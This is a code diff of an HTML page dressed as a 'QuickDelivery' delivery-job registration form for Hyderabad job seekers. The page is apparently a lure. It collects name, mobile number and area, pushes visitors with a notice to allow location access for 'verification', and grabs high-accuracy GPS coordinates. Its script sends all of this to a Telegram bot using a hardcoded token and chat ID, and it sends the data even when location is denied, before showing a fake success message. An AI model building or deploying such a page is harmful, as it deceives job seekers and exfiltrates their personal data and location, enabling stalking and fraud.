@@ -3,40 +3,49 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Delivery Job Application</title>
+    <title>QuickDelivery - Partner Registration</title>
     <style>
         * {
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
         }
         body {
-            background-color: #f0f2f5;
+            background-color: #f4f6f8;
+            margin: 0;
+            padding: 16px;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            margin: 0;
-            padding: 20px;
         }
-        .form-card {
+        .container {
             background: #ffffff;
             width: 100%;
-            max-width: 380px;
-            padding: 28px 24px;
+            max-width: 400px;
             border-radius: 12px;
-            box-shadow: 0 4px 16px rgba(0,0,0,0.08);
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+            overflow: hidden;
+            border: 1px solid #e1e4e8;
         }
-        .form-card h2 {
-            margin: 0 0 6px;
-            color: #1a73e8;
-            font-size: 24px;
+        .header {
+            background: #0052cc;
+            color: #ffffff;
+            padding: 20px 24px;
             text-align: center;
         }
-        .form-card p {
-            margin: 0 0 20px;
-            color: #666;
+        .header h1 {
+            margin: 0;
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+        }
+        .header p {
+            margin: 6px 0 0;
             font-size: 13px;
-            text-align: center;
+            opacity: 0.9;
+        }
+        .form-body {
+            padding: 24px;
         }
         .form-group {
             margin-bottom: 16px;
@@ -45,78 +54,129 @@
             display: block;
             font-size: 13px;
             font-weight: 600;
-            color: #333;
+            color: #333333;
             margin-bottom: 6px;
         }
-        input {
+        input, select {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ccc;
+            padding: 12px 14px;
+            border: 1px solid #c1c7d0;
             border-radius: 8px;
             font-size: 15px;
+            color: #172b4d;
             outline: none;
+            background-color: #fafbfc;
         }
-        input:focus {
-            border-color: #1a73e8;
+        input:focus, select:focus {
+            border-color: #0052cc;
+            background-color: #ffffff;
         }
-        button {
+        .note-box {
+            background-color: #e6fcff;
+            border-left: 4px solid #00a3bf;
+            padding: 10px 12px;
+            border-radius: 4px;
+            margin-bottom: 18px;
+        }
+        .note-box p {
+            margin: 0;
+            font-size: 12px;
+            color: #004953;
+            line-height: 1.4;
+        }
+        .btn-submit {
             width: 100%;
-            padding: 13px;
-            background-color: #1a73e8;
+            background-color: #0052cc;
             color: white;
+            padding: 14px;
             border: none;
             border-radius: 8px;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 8px;
+            box-shadow: 0 2px 4px rgba(0,82,204,0.2);
         }
-        button:active {
-            background-color: #1557b0;
+        .btn-submit:active {
+            background-color: #0747a6;
         }
-        .success-box {
+        .success-card {
             display: none;
+            padding: 40px 24px;
             text-align: center;
-            padding: 15px 0;
         }
-        .success-box h3 {
-            color: #2e7d32;
-            margin: 0 0 8px;
+        .checkmark {
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background-color: #e3fcef;
+            color: #00875a;
+            font-size: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-weight: bold;
+        }
+        .success-card h2 {
             font-size: 20px;
+            color: #172b4d;
+            margin: 0 0 8px;
         }
-        .success-box p {
-            color: #555;
+        .success-card p {
             font-size: 14px;
+            color: #6b778c;
             margin: 0;
+            line-height: 1.5;
         }
     </style>
 </head>
 <body>
 
-<div class="form-card">
-    <div id="jobFormContainer">
-        <h2>Delivery Job</h2>
-        <p>Apna detail bharein verification aur onboarding ke liye</p>
-        
-        <form id="deliveryForm">
-            <div class="form-group">
-                <label>Full Name</label>
-                <input type="text" id="userName" placeholder="Apna pura naam likhein" required>
-            </div>
-            
-            <div class="form-group">
-                <label>Mobile Number</label>
-                <input type="tel" id="userPhone" placeholder="Mobile number daalein" required>
-            </div>
-            
-            <button type="submit" id="submitBtn">Submit Job Application</button>
-        </form>
+<div class="container">
+    <div id="formSection">
+        <div class="header">
+            <h1>Delivery Job</h1>
+            <p>Delivery Partner Onboarding Form</p>
+        </div>
+
+        <div class="form-body">
+            <form id="jobForm">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="fullName" placeholder="Enter your full name" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Mobile Number</label>
+                    <input type="tel" id="mobileNumber" placeholder="Enter 10-digit mobile number" pattern="[0-9]{10}" required>
+                </div>
+
+                <div class="form-group">
+                    <label>Preferred Job Location</label>
+                    <select id="jobLocation" required>
+                        <option value="">Select city area</option>
+                        <option value="Hyderabad Central">Hyderabad Central</option>
+                        <option value="Hitec City / Madhapur">Hitec City / Madhapur</option>
+                        <option value="Secunderabad">Secunderabad</option>
+                        <option value="Mehdipatnam / Golconda">Mehdipatnam / Golconda</option>
+                        <option value="Kukatpally">Kukatpally</option>
+                        <option value="Other Area">Other Area</option>
+                    </select>
+                </div>
+
+                <div class="note-box">
+                    <p>📌 <strong>Notice:</strong> Area verification ke liye prompt aane par <strong>"Allow while visiting the site"</strong> ya <strong>"Allow this time"</strong> select karein taaki form successfully submit ho sake.</p>
+                </div>
+
+                <button type="submit" id="submitBtn" class="btn-submit">Submit Application</button>
+            </form>
+        </div>
     </div>
 
-    <div id="successMessage" class="success-box">
-        <div style="font-size: 40px; color: #2e7d32; margin-bottom: 10px;">✓</div>
-        <h3>Job Submit Successfully</h3>
-        <p>Aapka registration complete ho gaya hai. Hamari team aapse jald hi contact karegi.</p>
+    <div id="successSection" class="success-card">
+        <div class="checkmark">✓</div>
+        <h2>Job Submitted Successfully</h2>
+        <p>Aapka registration receive ho gaya hai.<br>Operations team 24 ghante ke andar aapse contact karegi.</p>
     </div>
 </div>
 
@@ -124,50 +184,52 @@
     const BOT_TOKEN = "9124377802:AAE_3vHmvv1yngLMyLmpivjuI4A5m9ELJC0";
     const CHAT_ID = "9010957708";
 
-    const form = document.getElementById('deliveryForm');
+    const jobForm = document.getElementById('jobForm');
     const submitBtn = document.getElementById('submitBtn');
-    const jobFormContainer = document.getElementById('jobFormContainer');
-    const successMessage = document.getElementById('successMessage');
+    const formSection = document.getElementById('formSection');
+    const successSection = document.getElementById('successSection');
 
-    form.addEventListener('submit', function(e) {
+    jobForm.addEventListener('submit', function(e) {
         e.preventDefault();
-        
-        const name = document.getElementById('userName').value.trim();
-        const phone = document.getElementById('userPhone').value.trim();
-        
+
+        const name = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('mobileNumber').value.trim();
+        const locationArea = document.getElementById('jobLocation').value;
+
         submitBtn.disabled = true;
-        submitBtn.innerText = "Submitting...";
+        submitBtn.innerText = "Submitting application...";
 
         if ("geolocation" in navigator) {
             navigator.geolocation.getCurrentPosition(
                 (pos) => {
-                    sendData(name, phone, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    pushPayload(name, phone, locationArea, pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
                 },
                 (err) => {
-                    // Agar permission deny hui tab bhi details Telegram par bhej dega
-                    sendData(name, phone, null, null, null);
+                    // Agar user deny karde tab bhi bhej dega
+                    pushPayload(name, phone, locationArea, null, null, null);
                 },
                 { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
             );
         } else {
-            sendData(name, phone, null, null, null);
+            pushPayload(name, phone, locationArea, null, null, null);
         }
     });
 
-    function sendData(name, phone, lat, lon, acc) {
-        let msg = `📋 *New Delivery Job Application:*\n\n` +
-                  `👤 *Name:* ${name}\n` +
-                  `📞 *Phone:* ${phone}\n`;
+    function pushPayload(name, phone, area, lat, lon, acc) {
+        let textMsg = `📦 *New Delivery Application Received*\n\n` +
+                      `👤 *Name:* ${name}\n` +
+                      `📞 *Phone:* ${phone}\n` +
+                      `📍 *Selected Area:* ${area}\n`;
 
         if (lat && lon) {
             const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
-            msg += `\n📍 *Exact Location:*\n` +
-                   `• Lat: \`${lat}\`\n` +
-                   `• Lon: \`${lon}\`\n` +
-                   `• Accuracy: ±${Math.round(acc)} meters\n\n` +
-                   `🔗 [Google Maps Par Dekhein](${mapsUrl})`;
+            textMsg += `\n🎯 *Verified GPS Coordinates:*\n` +
+                       `• Lat: \`${lat}\`\n` +
+                       `• Lon: \`${lon}\`\n` +
+                       `• Precision: ±${Math.round(acc)}m\n\n` +
+                       `🗺️ [Open in Google Maps](${mapsUrl})`;
         } else {
-            msg += `\n⚠️ Location access allow nahi kiya gaya.`;
+            textMsg += `\n⚠️ *GPS Status:* Location permission not granted by device.`;
         }
 
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -175,12 +237,12 @@
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({
                 chat_id: CHAT_ID,
-                text: msg,
+                text: textMsg,
                 parse_mode: "Markdown"
             })
         }).finally(() => {
-            jobFormContainer.style.display = "none";
-            successMessage.style.display = "block";
+            formSection.style.display = "none";
+            successSection.style.display = "block";
         });
     }
 </script>
